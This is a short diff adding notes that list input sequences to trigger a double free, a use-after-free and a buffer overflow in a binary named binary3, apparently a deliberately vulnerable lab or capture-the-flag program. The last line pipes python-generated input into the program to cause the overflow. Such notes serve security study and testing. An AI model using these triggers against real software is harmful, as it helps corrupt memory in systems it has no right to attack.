@@ -1,0 +1,18 @@
+To trigger double free vulnerability -->
+./binary3
+A
+1
+PUNATR
+3
+5
+
+To trigger use-after-free vulnerability -->
+./binary3
+A
+1
+PUNATR
+3
+3
+
+To trigger buffer overflow vulnerability -->
+{ python3 -c "print('a')"; python3 -c "print('1')"; python3 -c "print('A'*10+'PUBVPR')"; } | ./binary3
